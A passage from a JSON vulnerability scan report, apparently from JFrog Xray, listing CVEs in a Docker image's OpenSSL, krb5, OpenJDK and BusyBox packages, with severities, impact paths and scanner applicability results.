                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-4304",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-127996",
                    "summary": "MIT Kerberos 5 (aka krb5) before 1.17.2 and 1.18.x before 1.18.3 allows unbounded recursion via an ASN.1-encoded Kerberos message because the lib/krb5/asn.1/asn1_encode.c support for BER indefinite lengths lacks a recursion limit.",
                    "description": "MIT Kerberos 5 (aka krb5) before 1.17.2 and 1.18.x before 1.18.3 allows unbounded recursion via an ASN.1-encoded Kerberos message because the lib/krb5/asn.1/asn1_encode.c support for BER indefinite lengths lacks a recursion limit.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2020-28196",
                            "cwe": [
                                "CWE-674"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2020-11-08T00:00:00.608Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2020-28196",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195096",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21340",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.989Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21340",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-259738",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JNDI). Supported versions that are affected are Oracle Java SE: 8u341, 8u345-perf, 11.0.16.1, 17.0.4.1, 19; Oracle GraalVM Enterprise Edition: 20.3.7, 21.3.3 and 22.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21624",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2022-10-24T00:00:00.874Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21624",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-588700",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 7.4 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N).",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20918",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
                        }
                    ],
                    "created": "2024-01-17T00:00:00.168Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "cve_id": "CVE-2024-20918",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks for any non-default JVM flags that enable the vulnerable behavior -</p>\n<ul>\n<li><code>-XX:+NeverActAsServerClassMachine</code></li>\n<li><code>-XX:TieredStopAtLevel</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable flag '-XX:+NeverActAsServerClassMachine' is not found, The vulnerable flag '-XX:TieredStopAtLevel' is not found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "cve_id": "CVE-2024-20918",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks for any non-default JVM flags that enable the vulnerable behavior -</p>\n<ul>\n<li><code>-XX:+NeverActAsServerClassMachine</code></li>\n<li><code>-XX:TieredStopAtLevel</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable flag '-XX:+NeverActAsServerClassMachine' is not found, The vulnerable flag '-XX:TieredStopAtLevel' is not found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "cve_id": "CVE-2024-20918",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks for any non-default JVM flags that enable the vulnerable behavior -</p>\n<ul>\n<li><code>-XX:+NeverActAsServerClassMachine</code></li>\n<li><code>-XX:TieredStopAtLevel</code></li>\n</ul>",
                            "evidence": null,
                            "info": "The vulnerable flag '-XX:+NeverActAsServerClassMachine' is not found, The vulnerable flag '-XX:TieredStopAtLevel' is not found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-base:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20918",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20918",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:openjdk8-jre-lib:8.275.01-r0",
                            "vulnerability_id": "CVE-2024-20918",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-590726",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u391, 8u391-perf, 11.0.21, 17.0.9, 21.0.1; Oracle GraalVM for JDK: 17.0.9, 21.0.1; Oracle GraalVM Enterprise Edition: 20.3.12, 21.3.8 and  22.3.4. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 5.9 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-20921"
                        }
                    ],
                    "created": "2024-02-17T00:00:00.308Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-20921",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607949",
                    "summary": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
                    "description": "The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\ndecodes the \"name\" (e.g. \"CERTIFICATE\"), any header data and the payload data.\nIf the function succeeds then the \"name_out\", \"header\" and \"data\" arguments are\npopulated with pointers to buffers containing the relevant decoded data. The\ncaller is responsible for freeing those buffers. It is possible to construct a\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\nwill return a failure code but will populate the header argument with a pointer\nto a buffer that has already been freed. If the caller also frees this buffer\nthen a double free will occur. This will most likely lead to a crash. This\ncould be exploited by an attacker who has the ability to supply malicious PEM\nfiles for parsing to achieve a denial of service attack.\n\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\nPEM_read_bio_ex() and therefore these functions are also directly affected.\n\nThese functions are also called indirectly by a number of other OpenSSL\nfunctions including PEM_X509_INFO_read_bio_ex() and\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\nuses of these functions are not vulnerable because the caller does not free the\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\nOpenSSL 3.0.\n\nThe OpenSSL asn1parse command line application is also impacted by this issue.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-4450",
                            "cwe": [
                                "CWE-415"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-4450",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable functions is called:</p>\n<pre><code>PEM_read_bio_ex()\nPEM_read_bio()\nPEM_read()\nPEM_read_DHparams()\nPEM_read_PrivateKey()\nPEM_read_bio_PrivateKey()\nPEM_read_RSA_PUBKEY()\nPEM_read_bio_RSA_PUBKEY()\nPEM_read_RSAPrivateKey()\nPEM_read_bio_RSAPrivateKey()\nPEM_read_PKCS7()\nPEM_read_bio_PKCS7()\nPEM_read_X509()\nPEM_read_bio_X509()\nPEM_read_X509_AUX()\nPEM_read_bio_X509_AUX()\nPEM_read_X509_CRL()\nPEM_read_bio_X509_CRL()\nPEM_read_bio_X509_REQ()\nPEM_read_bio_ECPrivateKey()\nPEM_read_bio_PKCS8()\n\nPEM_X509_INFO_read_bio_ex()\nSSL_CTX_use_serverinfo_file()\nSSL_use_cert_and_key() \nSSL_CTX_use_certificate_chain_file()\nSSL_CTX_load_verify_locations()\nSSL_CTX_set1_verify_file()\nSSL_CTX_set1_verify_path()\nX509_LOOKUP_load_file()\n\nSSL_load_client_CA_file_ex()\nSSL_load_client_CA_file()\nSSL_add_file_cert_subjects_to_stack()\nSSL_add_dir_cert_subjects_to_stack()\nSSL_add_store_cert_subjects_to_stack()\n\nuse_certificate_chain_file\nSSL_use_certificate_file\nSSL_CTX_use_certificate_file\nSSL_use_PrivateKey_file\nSSL_CTX_use_PrivateKey_file\nSSL_CTX_use_serverinfo_file\n\nSSL_use_RSAPrivateKey_file\nSSL_CTX_use_RSAPrivateKey_file\n</code></pre>\n<p>Note that while the vulnerability is also exploitable through the use of the command line tool <code>openssl asn1parse</code>, the vulnerability's DoS impact in this case does not pose a threat, since the DoS will crash the forked <code>openssl</code> tool process only</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2022-4450",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks if at least one of the vulnerable functions is called:</p>\n<pre><code>PEM_read_bio_ex()\nPEM_read_bio()\nPEM_read()\nPEM_read_DHparams()\nPEM_read_PrivateKey()\nPEM_read_bio_PrivateKey()\nPEM_read_RSA_PUBKEY()\nPEM_read_bio_RSA_PUBKEY()\nPEM_read_RSAPrivateKey()\nPEM_read_bio_RSAPrivateKey()\nPEM_read_PKCS7()\nPEM_read_bio_PKCS7()\nPEM_read_X509()\nPEM_read_bio_X509()\nPEM_read_X509_AUX()\nPEM_read_bio_X509_AUX()\nPEM_read_X509_CRL()\nPEM_read_bio_X509_CRL()\nPEM_read_bio_X509_REQ()\nPEM_read_bio_ECPrivateKey()\nPEM_read_bio_PKCS8()\n\nPEM_X509_INFO_read_bio_ex()\nSSL_CTX_use_serverinfo_file()\nSSL_use_cert_and_key() \nSSL_CTX_use_certificate_chain_file()\nSSL_CTX_load_verify_locations()\nSSL_CTX_set1_verify_file()\nSSL_CTX_set1_verify_path()\nX509_LOOKUP_load_file()\n\nSSL_load_client_CA_file_ex()\nSSL_load_client_CA_file()\nSSL_add_file_cert_subjects_to_stack()\nSSL_add_dir_cert_subjects_to_stack()\nSSL_add_store_cert_subjects_to_stack()\n\nuse_certificate_chain_file\nSSL_use_certificate_file\nSSL_CTX_use_certificate_file\nSSL_use_PrivateKey_file\nSSL_CTX_use_PrivateKey_file\nSSL_CTX_use_serverinfo_file\n\nSSL_use_RSAPrivateKey_file\nSSL_CTX_use_RSAPrivateKey_file\n</code></pre>\n<p>Note that while the vulnerability is also exploitable through the use of the command line tool <code>openssl asn1parse</code>, the vulnerability's DoS impact in this case does not pose a threat, since the DoS will crash the forked <code>openssl</code> tool process only</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-4450",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2022-4450",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190234",
                    "summary": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
                    "description": "An out-of-bounds heap read in Busybox's unlzma applet leads to information leak and denial of service when crafted LZMA-compressed input is decompressed. This can be triggered by any applet/format that",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42374",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v2": "3.3/CVSS:2.0/AV:L/AC:M/Au:N/C:P/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.781Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5",
